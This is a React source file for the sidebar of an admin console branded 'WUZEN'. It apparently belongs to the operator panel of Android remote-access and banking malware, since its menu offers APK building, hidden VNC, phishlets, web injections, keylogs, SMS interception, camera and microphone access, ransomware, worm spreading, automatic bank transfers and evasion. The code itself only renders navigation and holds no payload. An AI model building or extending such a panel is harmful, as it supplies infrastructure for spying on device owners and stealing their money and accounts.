import { useNavigate, useLocation } from 'react-router-dom'
import { useStore } from '../store'
import {
  Home, Smartphone, Package, Shield, MapPin, Camera, Mic,
  FileText, Key, Bell, Rocket, MessageSquare, Phone,
  Wifi, Users, Wrench, Settings, LogOut, ChevronLeft, ChevronRight,
  Eye, Fingerprint, Activity, Clipboard, Lock, Bug, Radio,
  Monitor, Globe, Zap, Database, Trash, CreditCard, Worm,
  AlertTriangle, Layers, Terminal, HardDrive, AppWindow
} from 'lucide-react'

const menuItems = [
  { icon: Home, label: 'Home', path: '/' },
  { icon: Package, label: 'Build APK', path: '/build-apk' },
  { icon: Smartphone, label: 'Device Info', path: '/device-info' },
  { icon: Shield, label: 'Authenticator', path: '/authenticator' },
  { icon: Eye, label: 'Hidden VNC', path: '/hidden-vnc' },
  { icon: MapPin, label: 'Location', path: '/location' },
  { icon: Camera, label: 'Camera', path: '/camera' },
  { icon: Mic, label: 'Microphone', path: '/microphone' },
  { icon: Globe, label: 'Phishlets', path: '/phishlets' },
  { icon: Zap, label: 'Injections', path: '/injections' },
  { icon: Fingerprint, label: 'Biometrics', path: '/biometrics' },
  { icon: FileText, label: 'Logs', path: '/logs' },
  { icon: Key, label: 'Keylogs', path: '/keylogs' },
  { icon: Bell, label: 'Push Notification', path: '/push-notification' },
  { icon: Rocket, label: 'Launch Intent', path: '/launch-intent' },
  { icon: AlertTriangle, label: 'Notifications Log', path: '/notifications-log' },
  { icon: MessageSquare, label: 'SMS & Call', path: '/sms-call' },
  { icon: Clipboard, label: 'Clipboard', path: '/clipboard' },
  { icon: Users, label: 'Contacts', path: '/contacts' },
  { icon: AppWindow, label: 'Apps', path: '/apps' },
  { icon: Activity, label: 'Processes', path: '/processes' },
  { icon: Wifi, label: 'Network', path: '/network' },
  { icon: Monitor, label: 'Screen', path: '/screen' },
  { icon: HardDrive, label: 'Files', path: '/files' },
  { icon: Lock, label: 'Ransomware', path: '/ransomware' },
  { icon: Worm, label: 'Worm', path: '/worm' },
  { icon: CreditCard, label: 'ATS', path: '/ats' },
  { icon: Wifi, label: 'Firewall', path: '/firewall' },
  { icon: Bug, label: 'Evasion', path: '/evasion' },
  { icon: Terminal, label: 'Hardware', path: '/hardware' },
  { icon: Users, label: 'User Management', path: '/user-management' },
  { icon: Wrench, label: 'Toolkit', path: '/toolkit' },
  { icon: Settings, label: 'Settings', path: '/settings' },
]

export default function Sidebar() {
  const navigate = useNavigate()
  const location = useLocation()
  const { sidebarOpen, toggleSidebar, logout } = useStore()

  return (
    <aside className={`fixed left-0 top-0 h-full bg-wuzen-panel border-r border-wuzen-border z-50 transition-all duration-300 ${sidebarOpen ? 'w-64' : 'w-16'}`}>
      <div className="flex items-center justify-between h-16 px-4 border-b border-wuzen-border">
        {sidebarOpen && (
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-gradient-to-br from-wuzen-primary to-wuzen-accent rounded flex items-center justify-center">
              <Zap className="w-5 h-5 text-white" />
            </div>
            <div>
              <h1 className="text-lg font-bold tracking-wider text-wuzen-primary glow-text">WUZEN</h1>
              <p className="text-[10px] text-wuzen-muted tracking-widest">POWERED BY WUZEN</p>
            </div>
          </div>
        )}
        <button onClick={toggleSidebar} className="p-1 rounded hover:bg-wuzen-card text-wuzen-muted">
          {sidebarOpen ? <ChevronLeft className="w-4 h-4" /> : <ChevronRight className="w-4 h-4" />}
        </button>
      </div>

      <nav className="py-4 overflow-y-auto h-[calc(100%-8rem)]">
        {menuItems.map((item) => {
          const isActive = location.pathname === item.path || location.pathname.startsWith(item.path + '/')
          return (
            <button
              key={item.path}
              onClick={() => navigate(item.path)}
              className={`w-full flex items-center gap-3 px-4 py-2.5 text-sm transition-all duration-200 group
                ${isActive 
                  ? 'bg-wuzen-primary/10 text-wuzen-primary border-l-2 border-wuzen-primary' 
                  : 'text-wuzen-muted hover:text-wuzen-text hover:bg-wuzen-card border-l-2 border-transparent'}`}
              title={!sidebarOpen ? item.label : ''}
            >
              <item.icon className={`w-4 h-4 flex-shrink-0 ${isActive ? 'text-wuzen-primary' : 'text-wuzen-muted group-hover:text-wuzen-text'}`} />
              {sidebarOpen && <span className="truncate">{item.label}</span>}
            </button>
          )
        })}
      </nav>

      <div className="absolute bottom-0 left-0 right-0 p-4 border-t border-wuzen-border">
        <button
          onClick={logout}
          className={`flex items-center gap-2 text-wuzen-secondary hover:text-wuzen-danger transition-colors ${!sidebarOpen && 'justify-center'}`}
        >
          <LogOut className="w-4 h-4" />
          {sidebarOpen && <span className="text-sm">Logout</span>}
        </button>
        {sidebarOpen && (
          <div className="mt-2 flex items-center gap-2">
            <div className="w-2 h-2 rounded-full bg-wuzen-success animate-pulse" />
            <span className="text-[10px] text-wuzen-muted uppercase tracking-wider">Connected</span>
          </div>
        )}
      </div>
    </aside>
  )
}
